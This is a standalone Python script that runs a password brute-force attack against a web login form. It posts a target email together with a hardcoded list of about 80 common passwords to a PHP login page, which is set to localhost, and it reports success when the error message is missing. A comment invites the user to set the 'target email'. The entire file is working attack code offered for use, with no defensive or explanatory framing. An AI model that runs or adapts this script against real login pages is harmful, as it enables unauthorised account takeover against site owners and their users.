import requests
import time

def brute_force_attack(url, email, password_list):
    for password in password_list:
        data = {
            'email': email,
            'password': password
        }
        
        try:
            response = requests.post(url, data=data)
            
            # Check if login was successful
            if "Invalid email or password" not in response.text:
                print(f"[+] Success! Password found: {password}")
                return password
            
            print(f"[-] Trying password: {password}")
            time.sleep(1)  # Add delay to avoid overwhelming the server
            
        except Exception as e:
            print(f"Error: {e}")
            continue
    
    print("[-] Password not found in the list")
    return None

# Configuration
url = "http://localhost/Info/info/login.php"
email = "admin@example.com"  # Change this to your target email

# Common passwords to try
passwords = [
    "password",
    "123456",
    "admin",
    "admin123",
    "password123",
    "qwerty",
    "letmein",
    "welcome",
    "monkey",
    "dragon",
    "baseball",
    "football",
    "shadow",
    "michael",
    "mustang",
    "superman",
    "qazwsx",
    "trustno1",
    "jennifer",
    "hunter",
    "buster",
    "soccer",
    "harley",
    "batman",
    "andrew",
    "tigger",
    "sunshine",
    "iloveyou",
    "fuckme",
    "2000",
    "charlie",
    "robert",
    "thomas",
    "hockey",
    "ranger",
    "daniel",
    "starwars",
    "klaster",
    "112233",
    "george",
    "computer",
    "michelle",
    "jessica",
    "pepper",
    "1111",
    "zxcvbn",
    "555555",
    "11111111",
    "131313",
    "freedom",
    "7777777",
    "pass",
    "maggie",
    "159753",
    "aaaaaa",
    "ginger",
    "princess",
    "joshua",
    "cheese",
    "amanda",
    "summer",
    "love",
    "ashley",
    "nicole",
    "chelsea",
    "biteme",
    "matthew",
    "access",
    "yankees",
    "987654321",
    "dallas",
    "austin",
    "thunder",
    "taylor",
    "matrix",
    "mobilemail",
    "mom",
    "monitor",
    "monitoring",
    "montana",
    "moon",
    "moscow"
]

print("[*] Starting brute force attack...")
print(f"[*] Target URL: {url}")
print(f"[*] Target Email: {email}")
print("[*] Starting password attempts...")

brute_force_attack(url, email, passwords) 